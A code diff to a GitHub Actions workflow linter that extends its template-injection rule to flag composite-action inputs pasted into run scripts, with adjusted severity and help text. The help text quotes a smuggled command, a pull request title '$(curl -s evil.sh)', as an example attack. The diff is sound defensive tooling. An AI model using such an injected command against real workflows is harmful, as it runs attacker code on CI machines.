@@ -123,6 +123,9 @@ _UNTRUSTED = re.compile(
     r")"
 )
 _EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
+# In a composite action, inputs come from whichever workflow calls it, and that workflow may pass
+# a pull request title straight through: the action can't know, so it must not trust them.
+_ACTION_INPUT = re.compile(r"\binputs\.[A-Za-z_][\w-]*")
 
 
 def template_injection(wf: Workflow) -> Iterator[Finding]:
@@ -134,21 +137,25 @@ def template_injection(wf: Workflow) -> Iterator[Finding]:
             if not isinstance(node, ScalarNode):
                 continue
             for match in _EXPRESSION.finditer(node.value):
-                found = _UNTRUSTED.search(match.group(1))
-                if not found:
-                    continue
                 offset = node.value.count("\n", 0, match.start())
                 if node.style in ("|", ">"):
                     offset += 1  # the text starts on the line after "run: |"
-                yield _at(
-                    wf,
-                    node,
-                    "WG004",
-                    Severity.HIGH,
-                    f"'{found.group(0)}' can be set by outsiders and is pasted into a script;"
-                    " pass it through 'env:' and use the variable instead",
-                    line_offset=offset,
-                )
+                if found := _UNTRUSTED.search(match.group(1)):
+                    severity = Severity.HIGH
+                    message = (
+                        f"'{found.group(0)}' can be set by outsiders and is pasted into a script;"
+                        " pass it through 'env:' and use the variable instead"
+                    )
+                elif wf.is_action and (found := _ACTION_INPUT.search(match.group(1))):
+                    severity = Severity.MEDIUM
+                    message = (
+                        f"'{found.group(0)}' comes from the calling workflow, which may pass untrusted"
+                        " text, and is pasted into a script; pass it through 'env:' and use the"
+                        " variable instead"
+                    )
+                else:
+                    continue
+                yield _at(wf, node, "WG004", severity, message, line_offset=offset)
 
 
 # --- WG005 pull_request_target ---------------------------------------------------------------
@@ -239,12 +246,13 @@ RULES: tuple[Rule, ...] = (
     Rule(
         "WG004",
         "template-injection",
-        "Untrusted ${{ }} values inside run: or github-script",
+        "Untrusted ${{ }} values (or a composite action's inputs) inside run: or github-script",
         template_injection,
         help=(
             "${{ }} values are pasted into the script before it runs, so a pull request title like "
             '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
-            "script instead."
+            "script instead. In a composite action the same goes for ${{ inputs.* }}: the calling "
+            "workflow may pass untrusted text."
         ),
     ),
     Rule(
